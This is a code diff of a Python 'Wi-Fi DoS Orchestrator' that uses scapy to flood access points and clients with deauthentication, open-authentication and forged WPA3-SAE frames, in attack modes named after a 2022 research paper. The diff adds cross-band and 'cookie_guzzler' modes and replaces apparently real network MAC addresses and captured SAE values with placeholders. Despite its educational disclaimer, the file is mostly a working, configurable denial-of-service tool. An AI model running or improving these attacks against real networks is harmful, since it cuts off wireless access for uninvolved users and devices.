@@ -1,4 +1,15 @@
 #!/usr/bin/env python3
+"""
+================================================================================
+Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
+================================================================================
+Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
+Journal of Information Security and Applications (2022)
+
+FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
+================================================================================
+"""
+
 import subprocess
 import time
 import os
@@ -8,47 +19,63 @@ import glob
 import random
 from multiprocessing import Process, Value
 
-# ======================== CONFIGURATION ========================
-# Your target BSSIDs for both bands
-TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
-TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"
+# =====================================================================================
+# ======================== CENTRAL CONFIGURATION ======================================
+# =====================================================================================
 
-# --- OPTIONAL SCANNER ---
-# Leave this field empty (SCANNER_INTERFACE = "") to disable the scanner.
-# NOTE: Without a scanner, you must manually enter the channels.
-SCANNER_INTERFACE = "wlan0mon" # e.g. "wlan2mon" or ""
+# --- 1. TARGET DATA ---
+TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
+TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"
 
-# --- MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
-# Enter channels manually here. Skips the scan and starts the attack immediately.
+# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
+# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!
+
+# > Parameters for 2.4 GHz Network
+SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE'
+SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE'
+
+# > Parameters for 5 GHz Network
+SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
+SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'
+
+# --- 3. OPTIONAL SCANNER ---
+SCANNER_INTERFACE = "" # e.g. "wlan2mon" or ""
+
+# --- 4. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
 MANUELLER_KANAL_5GHZ = "36"
 MANUELLER_KANAL_2_4GHZ = "1"
 
-# --- 4. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
+# --- 5. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
+# Enter the real MAC addresses of connected devices here.
+#
+# IMPORTANT FOR RADIO CONFUSION ATTACK:
+# The clients listed here must be visible on the band you are attacking FROM.
+# - If you start the attack on 2.4 GHz (Adapter on Channel 1-13): 
+#   -> Enter MAC addresses of clients currently connected to 2.4 GHz.
+# - If you start the attack on 5 GHz (Adapter on Channel 36+):   
+#   -> Enter MAC addresses of clients currently connected to 5 GHz.
 TARGET_STA_MACS = [
-    "30:34:DB:11:48:09",
-    "06:B2:AA:AC:5D:31"#,
-#    "6C:99:9D:95:70:8F",
-#    "6E:8F:9F:B4:3D:10"#,
-#    "82:49:2C:43:16:81"
+    "AA:BB:CC:DD:EE:11",
+    "AA:BB:CC:DD:EE:11"
 ]
 
-# --- 5. CONFIGURATION FOR THE "AMPLIFICATION" ATTACK ---
+# --- 6. AMPLIFICATION REFLECTORS ---
 # Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
 # The more APs listed here, the greater the channel saturation.
 AMPLIFICATION_REFLECTOR_APS_5GHZ = [
-    "E0:28:6D:E4:D1:86", # UPC9918194
-    "8A:67:72:81:9C:68", # (Hidden Network)
-    "D4:86:60:A3:F9:6F",
-    "8C:6A:8D:93:77:48", 
-    "28:AA:3C:3D:E0:F3", # (Hidden Network)
-    "64:67:72:81:9C:6E"  # Your main target
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11",
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11"  
 ]
 AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
-    "70:54:25:5B:AE:E7", 
-    "F8:D2:AC:D6:79:38", 
-    "64:67:72:81:9C:6D", 
-    "8C:6A:8D:93:77:40", 
-    "34:2C:C4:3C:3D:72"     
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11", 
+    "AA:BB:CC:DD:EE:11"     
 ]
 # ====================== ENCYCLOPEDIA OF ATTACKS ======================
 #
@@ -80,7 +107,10 @@ AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
 #     Most effective band: Both bands (Universal).
 #     Suitable for: WPA3.
 #
-#
+# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
+#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
+#             send a disproportionately large number of response frames, thereby overloading itself.
+#     Suitable for: WPA3.
 # --- Category: Universal & Vendor-Specific Attacks ---
 #
 # "open_auth": Classic DoS attack with Open Authentication requests.
@@ -95,6 +125,16 @@ AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
 #     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
 #     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages that clog the channel) 2.4 GHz Band.
 #
+# "radio_confusion": GENERIC Cross-Band Attack (Broadcom & MediaTek).
+#     Effect: Sends SAE frames to the BSSID of the *opposite* band.
+#     Mechanism: - If you start the attack on the 2.4 GHz band, the 5 GHz network is targeted/crashed.
+#                - If you start the attack on the 5 GHz band, the 2.4 GHz network is targeted/crashed.
+#     Why generic? This script automatically detects the adapter's band and targets the opposite one.
+#                  It covers specific vendor vulnerabilities described in the paper:
+#                  - Case 6 (Broadcom) & Case 13 Reverse (MediaTek) -> Attack from 2.4GHz to crash 5GHz.
+#                  - Case 6 Reverse (Broadcom) & Case 13 (MediaTek) -> Attack from 5GHz to crash 2.4GHz.
+#     Note: In the 'Master' script, these are split into specific cases. Here, one logic rules them all.
+#
 # "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
 #     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
 #             the WPA2 AP with these packets to fill its memory and cause it to crash.
@@ -102,27 +142,17 @@ AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
 #     Suitable for: WPA2 (Specifically targets WPA2 APs).
 #
 # ==============================================================================================
-
 # --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
 # Enter each attack adapter here with its target band and the desired attack.
 ADAPTER_KONFIGURATION = {
-    # --- Adapters for the 5 GHz Band ---
-#    "wlan3mon": {"band": "5GHz", "angriff": "amplification"},
-#   "wlan4mon": {"band": "5GHz", "angriff": "double_decker"},
-#   "wlan5mon": {"band": "5GHz", "angriff": "open_auth"},
-#    "wlan2mon": {"band": "5GHz", "angriff": "amplification"},
-#    "wlan6mon": {"band": "5GHz", "angriff": "double_decker"},
-#    "wlan10mon": {"band": "5GHz", "angriff": "double_decker"},
-#    "wlan9mon": {"band": "5GHz", "angriff": "double_decker"}#,
-    # --- Adapters for the 2.4 GHz Band ---
-#    "wlan4mon": {"band": "2.4GHz", "angriff": "open_auth"},
-#    "wlan6mon": {"band": "2.4GHz", "angriff": "amplification"},
-#    "wlan3mon": {"band": "2.4GHz", "angriff": "amplification"},
-#    "wlan4mon": {"band": "2.4GHz", "angriff": "amplification"},
-    "wlan1mon": {"band": "2.4GHz", "angriff": "amplification"}#,    
-#    "wlan10mon": {"band": "2.4GHz", "angriff": "amplification"}
+    # --- 5 GHz Band ---
+    # "wlan2mon": {"band": "5GHz", "angriff": "amplification"},
+    
+    # --- 2.4 GHz Band ---
+    # "wlan1mon": {"band": "2.4GHz", "angriff": "amplification"},
+    # "wlan3mon": {"band": "2.4GHz", "angriff": "omnivore"},
+     "wlan4mon": {"band": "2.4GHz", "angriff": "double_decker"}
 }
-
 # ==============================================================================================
 # ================= WHY MIXING ATTACKS IS SO EFFECTIVE (A "SYMPHONY OF CHAOS") =================
 #
@@ -181,31 +211,9 @@ ADAPTER_KONFIGURATION = {
 #     - Right-click on the "Scalar" field, select "Copy" -> "Value", and paste it into `SAE_SCALAR_HEX`.
 #     - Repeat this for the "Finite Field Element" and paste it into `SAE_FINITE_ELEMENT_HEX`.
 # ==============================================================================================
-SAE_SCALAR_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
-SAE_FINITE_ELEMENT_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
-#
-# ================= HOW TO VERIFY ATTACK SUCCESS =================
-#
-# In Terminal 1 (The Observer):
-#     # Replace BSSID and interface name
-#     sudo tshark -i wlan10mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6D" -T fields -e frame.time_delta_displayed
-#     sudo tshark -i wlan6mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E" -T fields -e frame.time_delta_displayed
-#
-#
-#sudo tshark -i wlan6mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 7C:0A:3F:6E:A1:58 || wlan.addr == 82:49:2C:43:16:81) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
-#
-#sudo tshark -i wlan7mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 7C:0A:3F:6E:A1:58 || wlan.addr == 82:49:2C:43:16:81) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
-#
-#
-#
-#     sudo tshark -i wlan2mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 8C:6A:8D:93:77:48" -T fields -e frame.time_delta_displayed
-#     sudo tshark -i wlan1mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 8C:6A:8D:93:77:40" -T fields -e frame.time_delta_displayed
-# In Terminal 2 (The Attacker):
-#     sudo python3 orchestator_final_mit_allen_details_de.py
-#
-# Analyze the output in Terminal 1 for "Beacon Jitter" (Values much larger than 0.1024).
-#
+# ======================== ATTACK LOGIC ========================================================
 # ==============================================================================================
+
 def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, finite_hex, counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
     from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp, Raw
     
@@ -217,15 +225,22 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, fin
         print(f"[ERROR] Channel switch for {interface} failed.")
         return
 
-    SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
-    SAE_FINITE_BYTES = bytes.fromhex(finite_hex)
+    # Prepare SAE Payload
+    try:
+        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
+        SAE_FINITE_BYTES = bytes.fromhex(finite_hex)
+    except (ValueError, TypeError):
+        print(f"[ERROR] Invalid SAE HEX values for {interface}. Stopping process.")
+        return
     
     try:
         while True:
-            # --- Attack Type: Deauth Flood ---
+            # ==========================================
+            # 1. DEAUTH FLOOD
+            # ==========================================
             if attack_type == "deauth_flood":
                 targets_this_round = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
-                if not sta_macs: print(f"[WARNING-DEAUTH] No specific target clients for {interface}. Broadcast attack only.", file=sys.stderr)
+                if not sta_macs: print(f"[WARNING-DEAUTH] No target client for {interface}. Broadcast only.", file=sys.stderr)
 
                 for sta_mac in targets_this_round:
                     packet_to_client = RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
@@ -237,10 +252,12 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, fin
                     with counter.get_lock(): counter.value += len(packets) * 50
                 time.sleep(0.2)
 
-            # --- Attack Type: Amplification ---
+            # ==========================================
+            # 2. AMPLIFICATION
+            # ==========================================
             elif attack_type == "amplification":
                 if not amplification_targets or len(amplification_targets) < 2: 
-                    print(f"[WARNING] For 'amplification' on {interface} at least 2 reflectors are needed. Process paused.", file=sys.stderr)
+                    print(f"[WARNING] 'amplification' on {interface} needs >2 reflectors. Paused.", file=sys.stderr)
                     time.sleep(999); continue
                 source_ap, dest_ap = random.sample(amplification_targets, 2)
                 
@@ -249,16 +266,17 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, fin
                 with counter.get_lock(): counter.value += 50
                 time.sleep(0.5)
 
-            # --- Attack Type: Double Decker ---
+            # ==========================================
+            # 3. DOUBLE DECKER
+            # ==========================================
             elif attack_type == "double_decker":
-                # CORRECTION: The dead condition was removed. The target is always the BSSID of the assigned band.
                 target_bssid = bssid
                 
-                # Phase 1: Omnivore (random MACs)
+                # Phase 1: Omnivore (Random MACs)
                 omnivore_dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=str(RandMAC()), addr3=target_bssid)
                 packet_omnivore = RadioTap()/omnivore_dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                 
-                # Phase 2: Muted (fixed MAC)
+                # Phase 2: Muted (Fixed MAC)
                 muted_mac = sta_macs[0] if sta_macs else "DE:AD:BE:EF:CA:FE"
                 muted_dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=muted_mac, addr3=target_bssid)
                 packet_muted = RadioTap()/muted_dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
@@ -268,27 +286,44 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, fin
                 with counter.get_lock(): counter.value += 128
                 time.sleep(0.5)
             
-            # --- All other attacks (SAE-based and Open-Auth) ---
+            # ==========================================
+            # 4. GENERIC SAE ATTACKS (Omnivore, Muted, Hasty, etc.)
+            # ==========================================
             else:
-                mac_to_use = str(RandMAC()) if attack_type != "muted" else sta_macs[0] if sta_macs else "DE:AD:BE:EF:CA:FE"
-                target_bssid = opposite_bssid if attack_type == "radio_confusion" else bssid
-                dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=mac_to_use, addr3=target_bssid)
+                # Handle MAC address (Random or Fixed)
+                if attack_type == "muted":
+                    mac_to_use = sta_macs[0] if sta_macs else "DE:AD:BE:EF:CA:FE"
+                else:
+                    mac_to_use = str(RandMAC())
                 
+                # Handle Target BSSID (Normal or Cross-Band)
+                if attack_type == "radio_confusion":
+                    target_bssid = opposite_bssid 
+                else:
+                    target_bssid = bssid
+                
+                dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=mac_to_use, addr3=target_bssid)
                 packet = None
                 
-                if attack_type in ["omnivore", "muted", "back_to_the_future", "radio_confusion", "hasty"]: 
+                # SAE-based attacks
+                if attack_type in ["omnivore", "muted", "back_to_the_future", "radio_confusion", "hasty", "cookie_guzzler"]: 
                     packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
+                    
+                    # Hasty adds the Confirm frame immediately
                     if attack_type == "hasty":
                         confirm_packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=0)
                         packet = [packet, confirm_packet]
 
+                # Open Authentication
                 elif attack_type == "open_auth": 
                     packet = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=1, status=0)
 
+                # Not implemented
                 elif attack_type == "gobbler":
-                    print(f"[WARNING] '{attack_type}' is not implemented. Process paused.", file=sys.stderr)
+                    print(f"[WARNING] '{attack_type}' not implemented. Paused.", file=sys.stderr)
                     time.sleep(999); continue
 
+                # Send
                 if packet:
                     sendp(packet, count=128, inter=0.005, iface=interface, verbose=0)
                     with counter.get_lock(): counter.value += 128 * (2 if isinstance(packet, list) else 1)
@@ -314,14 +349,11 @@ def get_target_info_from_csv(csv_file_path):
     targets_info = {'5ghz': None, '2.4ghz': None}
     try:
         with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
-        
-        ap_start_index = -1
-        client_start_index = len(lines)
+        ap_start_index = -1; client_start_index = len(lines)
         for i, line in enumerate(lines):
             if "BSSID, First time seen" in line: ap_start_index = i + 1
             elif "Station MAC, First time seen" in line: client_start_index = i; break
         if ap_start_index == -1: return targets_info
-
         ap_lines = [line for line in lines[ap_start_index:client_start_index] if line.strip()]
         reader = csv.reader(ap_lines)
         for row in reader:
@@ -343,7 +375,7 @@ def main():
     print("[INFO] Cleaning up old scan files...")
     for f in glob.glob("scan_result*"):
         try: os.remove(f)
-        except OSError as e: print(f"[WARNING] Could not delete old scan file {f}: {e}")
+        except OSError: pass
 
     scanner_aktiv = bool(SCANNER_INTERFACE)
     manuelle_zuweisung = bool(MANUELLER_KANAL_5GHZ and MANUELLER_KANAL_2_4GHZ)
@@ -394,7 +426,7 @@ def main():
                     current_targets['2.4ghz'] = new_targets['2.4ghz']
                     interfaces_to_restart.extend([iface for iface, conf in ADAPTER_KONFIGURATION.items() if conf['band'] == '2.4GHz'])
                 if interfaces_to_restart:
-                    print(f"[INFO] Stopping and restarting processes for: {', '.join(set(interfaces_to_restart))}")
+                    print(f"[INFO] Restarting processes for: {', '.join(set(interfaces_to_restart))}")
                     for interface in set(interfaces_to_restart):
                         if procs.get(interface) and procs[interface].is_alive():
                             procs[interface].terminate(); procs[interface].join(); del procs[interface]
@@ -414,7 +446,24 @@ def main():
                         if attack_type == "amplification":
                             amplification_list = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                         
-                        args = (interface, bssid, channel, attack_type, SAE_SCALAR_HEX, SAE_FINITE_ELEMENT_HEX, counters[interface])
+                        # ==================================================
+                        # SMART SAE PARAMETER SELECTION
+                        # ==================================================
+                        # 1. Determine TARGET band (Normal or Cross-Band)
+                        if attack_type == "radio_confusion":
+                            target_band_for_params = '5GHz' if band == '2.4GHz' else '2.4GHz'
+                        else:
+                            target_band_for_params = band
+
+                        # 2. Select parameters
+                        if target_band_for_params == '5GHz':
+                            scalar_to_use = SAE_SCALAR_5_HEX
+                            finite_to_use = SAE_FINITE_5_HEX
+                        else:
+                            scalar_to_use = SAE_SCALAR_2_4_HEX
+                            finite_to_use = SAE_FINITE_2_4_HEX
+
+                        args = (interface, bssid, channel, attack_type, scalar_to_use, finite_to_use, counters[interface])
                         kwargs = {'sta_macs': TARGET_STA_MACS, 'amplification_targets': amplification_list, 'opposite_bssid': opposite_bssid}
                         
                         procs[interface] = Process(target=run_attacker_process, args=args, kwargs=kwargs)
